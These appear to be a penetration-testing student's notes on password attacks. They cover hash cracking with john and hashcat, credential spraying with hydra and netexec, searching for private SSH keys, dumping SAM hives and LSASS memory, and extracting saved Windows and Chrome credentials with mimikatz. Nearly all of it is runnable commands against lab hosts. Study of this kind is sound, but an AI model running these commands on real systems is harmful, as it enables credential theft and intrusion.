Passwords are commonly hashed when stored.  
Hashing is a mathematical function which transforms arbitrary number of input bytess into fixed-size output.  
examples: md5, sha-256  
**Password cracking**: using rainbow tables, dictionary wordlists, bruteforce  
Rainbow tables are large pre-compiled maps of input to output for a given hash function.  
can be used to quickly id pass if hash already mapped.  

Salt: random squence of bytes added to a password before it is hashed.  
salts are typically prepended to corresponding hashes  

Brute-force attack: all possible combinations  
Dictionary attack: wordlist attack, most efficient  
weakpass generator, seclists, rockyou.txt  

**Identifying hash formats**:  
https://openwall.info/wiki/john/sample-hashes  
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

hashid -j xxxxxxxxx  //id john format  
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'  //id hashcat module type  


**John The Ripper**: aka john  
john --single passwd  //single crack mode - rule based, good for cracking linux pass - file to include passwd full line not just hash  
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  //wordlist mode  
john --incremental hash.txt  //brute-force style, most time consuming, defined in: /etc/john/john.conf  
john --format=krb4 hash.txt --wordlist=wordlist.txt  //specify format  
ssh2john ssh.privatekey > file.hash  //converts password protected file into john hash  
locate *2john*   //list all the supported conversions of pasword protected files  

**Hashcat**:  
hashcat --help  
ls -l /usr/share/hashcat/rules  //rules  
hashcat -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  //using rule  
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'  //Upperletter4lowerlettersdigitandSPACE -- mask attack -a 3  
//use mask attack when there is a static pattern !!  
//use rules for better results  

**Generating custom wordlists and Rules**:  
https://weakpass.com/tools/passgen   //weak pass generator - now provides wordlist  

hashcat rules - /usr/share/hashcat/rules/best64.rule  -- widely used  
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list  //generate a wordlist based on custom rules file  
with known pass policy and few details of the target user, can use below  
hashcat -m 0 hash mark -r rule  //mark is the file with words of known info, ask gpt for rule  

cewl https://www.sodium410.com -d 4 -m 6 --lowercase -w words.txt  //generates min len 6 pass in lowercase with 4 spider depth  

**Cracking Protected Files**: locate *2john* | grep pdf    
https://fileinfo.com/filetypes/encoded  

Find SSH keys:  
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null  
One way to tell whether an SSH key is encrypted or not, is to try reading the key with ssh-keygen.  
ssh-keygen -yf ~/.ssh/id_rsa   //asks for a passphrase !!  

ssh2john.py SSH.private > ssh.hash  //ssh2john  
office2john.py Protected.docx > protected-docx.hash  
pdf2john.py PDF.pdf > pdf.hash  
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt ssh.hash  //crack the hash for passphrase  
john pdf.hash --show  //show cracked pass of hash  

Cracking openssl encrypted GZIP files  
file test.gzip  ///show fiLe info  
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done  
//throws errors ignore, once loop finished check the current dir for extracted files  

Cracking Bitlocker-encrypted drives: common to find virtual hard drives    
bitlocker2john -i Backup.vhd > backup.hashes  
grep "bitlocker\$0" backup.hashes > backup.hash  //filter for bitlocker password hash  
//outputs 4 diff hashes, try the first one later two are recovery key hashes  
hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329........8ec54f' /usr/share/wordlists/rockyou.txt  

To mount bitlocker encyrpted drives in windows - double click  
on linux - install - sudo apt install dislocker  
google for steps  

**Remote Service Password attacks**:  
Winrm:  
netexec winrm 10.129.42.197 -u user.list -p password.list  //crackmapexec spray  
evil-winrm -i 10.129.42.197 -u user -p password  //evil-winrm gives powershell  

SSH/RDP/SMB:  
hydra -L user.list -P password.list ssh://10.129.42.197  
hydra -L user.list -P password.list rdp://10.129.42.197  
hydra -L user.list -P password.list smb://10.129.42.197  
//if errors for smb use crackmapexec or msf  

**Credential spraying/stuffing**:  
netexec smb 10.100.38.0/24 -u usernames.list> -p 'ChangeMe123!'  
hydra -C user_pass.list ssh://10.100.38.23  //-C for list with user:pass format  

**Default creds**:  
https://github.com/ihebski/DefaultCreds-cheat-sheet  
https://www.softwaretestinghelp.com/default-router-username-and-password-list/  
pip3 install defaultcreds-cheat-sheet  //install 
creds search cisco  //search  

**Extracting Passwords from Windows Systems**:  
LSASS: Local Security authoriry subsystem service: authenticates users, manages local logins, users to SID   
SAM(Security account manager) database: stores LM or NTLM hashes, C:\system32\SAM, system priv  
AD database of creds: %SystemRoot%\ntds.dit  
*Credential manager*: built-in win featyre to store/manage creds for web,apps,network  
C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\  //for every user  

**Local dumping**: say with shell to windows system..  
Registry hives: copy these and extract pass using secretsdump  
HKLM\SAM: sam db  
HKLM\SYSTEM: key that encrypts SAM  
HKLM\SECURITY: cached domain and cleartext pass used by LSA  

reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

impacket-secretsdump.py -sam sam.save -security security.save -system system.save LOCAL //dumps creds from all 3 hives  
Copy just the NT hash(2nd part) and crack it using hashcat  
sudo hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt  
hklm\security contains cached domain logon information, specifically in the form of DCC2 hashes, more diff to crack and can;t be used for PTH..  
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt  

DPAPI creds used by credential manager, browsers to encrypt saved creds, can also be cracked using mimikatz  
C:\Users\Public> mimikatz.exe  
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect  

**Remote dumping**: with creds..  try both crackmapexec and secretsdump  
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa  //lsa  
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam  //sam  
secretsdump.py DOMAIN/user:Password123@192.168.1.10  //no domain for local accounts  

Attacking LSASS: just like we manually extracted SAM, can do lsass dump save it and crack offline with pypikatz  
with powershell find the pid and dump it with rundll32..  
Get-Process lsass  
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
pypykatz lsa minidump /home/peter/Documents/lsass.dmp   
//this is manual, better use secretsdump or crackmapexec or mimikatz  

**Attacking windows credential manager**:
cmdkey /list //cmd //creds stored in current user profile  
runas /savecred /user:SRV01\mcharles cmd  //if any domain interactive creds found, can switch to using runas  
With mimikatz..  reveaks pass hash as welll //mimikatz requires admin, so first imperosnate then run mimikatz or Lazagne creds manager stealer       
mimikatz.exe  
privilege::debug  
sekurlsa::credman  
Lasagne is much simpler, jsut run exe - reveals cleartext pass..  








